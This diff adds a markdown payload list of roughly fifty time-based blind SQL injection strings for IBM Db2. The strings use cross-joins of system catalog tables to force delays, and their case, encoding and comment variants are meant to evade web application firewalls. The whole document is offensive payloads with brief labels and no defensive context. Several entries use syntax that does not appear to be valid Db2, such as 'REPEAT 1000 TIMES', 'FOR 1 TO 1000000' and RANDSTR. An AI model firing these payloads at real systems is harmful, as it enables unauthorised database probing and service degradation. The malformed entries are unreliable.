@@ -1,0 +1,99 @@
+# IBM Db2
+
+These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
+
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b, sysibm.syscolumns c) >0 --**  
+  Triple cross-join columns count.
+- **' AND (SELECT COUNT(*) FROM sysibm.systables t1, sysibm.systables t2) >0 --**  
+  Tables cross-join.
+- **' aNd (SeLeCt CoUnT(*) FrOm SySiBm.SyScOlUmNs A, SySiBm.SyScOlUmNs B) >0 --**  
+  Case variation cross-join.
+- **%27%20AND%20(SELECT%20COUNT(*)%20FROM%20sysibm.syscolumns%20a,%20sysibm.syscolumns%20b)%20>0%20--**  
+  URL-encoded cross-join.
+- **%2527%20AND%20(SELECT%20COUNT(*)%20FROM%20sysibm.syscolumns%20a,%20sysibm.syscolumns%20b)%20>0%20--**  
+  Double URL cross-join.
+- **\u0027 AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) >0 --**  
+  Unicode cross-join.
+- **' OR (SELECT COUNT(*) FROM sysibm.sysdummy1 a, sysibm.sysdummy1 b WHERE 1=1) >0 --**  
+  OR dummy cross-join.
+- **' UNION SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b --**  
+  UNION count.
+- **' AND 1=(SELECT COUNT(*) FROM sysibm.systables t1 CROSS JOIN sysibm.systables t2) --**  
+  Explicit CROSS JOIN.
+- **' AND (SELECT * FROM (SELECT COUNT(*) FROM sysibm.syscolumns a JOIN sysibm.syscolumns b ON 1=1) x) >0 --**  
+  Nested JOIN count.
+- **'/*comment*/AND/*comment*/(SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)>0 --**  
+  Inline comments cross-join.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b/* */) >0 --**  
+  Param comment cross-join.
+- **' AND/**/(SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)>0 --**  
+  Full comment wrap.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)>0--**  
+  Dash comment.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)>0#**  
+  Hash comment.
+- **%27%20OR%20(SELECT%20COUNT(*)%20FROM%20sysibm.syscolumns%20a,%20sysibm.syscolumns%20b)>0%20--**  
+  URL OR cross-join.
+- **' AND 1= (SELECT COUNT(*) FROM sysibm.systables t1, sysibm.systables t2, sysibm.systables t3) --**  
+  Triple tables count.
+- **' AND RAND() + (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) --**  
+  RAND nested count.
+- **' HAVING (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)>0 --**  
+  HAVING cross-join.
+- **' ORDER BY (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) --**  
+  ORDER BY count.
+- **' GROUP BY (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) --**  
+  GROUP BY count.
+- **' AND (SELECT COUNT(*) FROM sysibm.sysversions a, sysibm.sysversions b) >0 --**  
+  Sysversions cross-join.
+- **' AND (SELECT COUNT(*) FROM sysibm.sysdummy1 REPEAT 1000 TIMES) >0 --**  
+  REPEAT dummy.
+- **' AND XMLCOMMENT((SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)) --**  
+  XMLCOMMENT nested.
+- **' AND CAST((SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) AS INT) --**  
+  CAST count.
+- **\u0027\u0020AND\u0020(SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) >0\u0020--**  
+  Unicode spaced.
+- **' AND (SELECT COUNT(*) FROM syscat.tables t1, syscat.tables t2) >0 --**  
+  Syscat tables cross.
+- **' AND 1=(SELECT 1 FROM sysibm.sysdummy1 WHERE (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)>0) --**  
+  WHERE nested count.
+- **' OR (SELECT COUNT(*) FROM sysibm.sysindexes i1, sysibm.sysindexes i2) >0 --**  
+  OR indexes cross.
+- **%2527%2520AND%2520(SELECT%2520COUNT(*)%2520FROM%2520sysibm.syscolumns%2520a,%2520sysibm.syscolumns%2520b)%2520>0%2520--**  
+  Double URL spaced.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a CROSS JOIN sysibm.syscolumns b CROSS JOIN sysibm.syscolumns c) >0 --**  
+  Triple CROSS JOIN.
+- **' AND REPEAT((SELECT COUNT(*) FROM sysibm.sysdummy1),10000) --**  
+  REPEAT 10000 dummy.
+- **' AND (VALUES (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)) --**  
+  VALUES nested count.
+- **' AND 1=ABS((SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)) --**  
+  ABS count.
+- **' UNION ALL SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b --**  
+  UNION ALL count.
+- **' AND (SELECT * FROM sysibm.sysdummy1 FOR 1 TO 1000000) >0 --**  
+  FOR loop dummy.
+- **' AND RANDSTR(1000000,(SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b)) --**  
+  RANDSTR heavy.
+- **' AND (SELECT COUNT(*) FROM sysibm.systables t1 JOIN sysibm.systables t2 ON 1=1 JOIN sysibm.systables t3 ON 1=1) >0 --**  
+  Triple JOIN.
+- **'/*foo*/ AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) >0 /*bar*/ --**  
+  Nested comments.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b WHERE 1=1) >0--+**  
+  Plus comment.
+- **' AND (SELECT COUNT(*) FROM syscat.columns c1, syscat.columns c2) >0 --**  
+  Syscat columns cross.
+- **' OR (SELECT COUNT(*) FROM sysibm.sysroutines r1, sysibm.sysroutines r2) >0 --**  
+  OR routines cross.
+- **' AND (SELECT COUNT(*) FROM sysibm.sysviews v1, sysibm.sysviews v2) >0 --**  
+  Views cross-join.
+- **' AND (SELECT COUNT(*) FROM sysibm.systables t1, sysibm.systables t2, sysibm.systables t3, sysibm.systables t4) >0 --**  
+  Quad tables count.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscolumns a JOIN sysibm.syscolumns b ON a.colname=b.colname JOIN sysibm.syscolumns c ON a.colname=c.colname) >0 --**  
+  ON condition JOIN.
+- **' AND LENGTH(REPEAT('a',1000000)) >0 --**  
+  LENGTH REPEAT heavy.
+- **' AND (SELECT COUNT(*) FROM sysibm.syscat r1, sysibm.syscat r2) >0 --**  
+  Syscat cross.
+
